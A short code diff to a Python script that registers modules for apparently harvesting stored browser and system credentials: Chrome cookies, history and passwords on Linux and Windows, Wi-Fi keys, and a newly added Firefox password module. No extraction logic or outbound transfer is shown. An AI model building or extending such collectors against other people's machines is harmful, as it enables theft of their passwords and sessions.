@@ -1,6 +1,8 @@
 #!/usr/local/bin/python
 # coding: utf-8
 
+import time
+
 from modules.linux.chrome.cookie import LinuxChromeCookie
 from modules.linux.chrome.download import LinuxChromeDownload
 from modules.linux.chrome.history import LinuxChromeHistory
@@ -14,7 +16,10 @@ from modules.windows.chrome.download import WindowsChromeDownload
 from modules.windows.chrome.cookie import WindowsChromeCookie
 from modules.windows.chrome.saved_data import WindowsChromeSavedData
 
+from modules.windows.firefox.password import WindowsFirefoxPassword
+
 from modules.windows.wifi import WindowsWifi
+
 
 modules = [
 		LinuxChromeCookie(),
@@ -23,12 +28,13 @@ modules = [
 		LinuxChromeDbPassword(),
 		LinuxChromeKeyringPassword(),
 
-
 		WindowsChromePassword(),
 		WindowsChromeHistory(),
 		WindowsChromeDownload(),
 		WindowsChromeCookie(),
 		WindowsChromeSavedData(),
+
+		WindowsFirefoxPassword(),
 
 		WindowsWifi(),
 	]
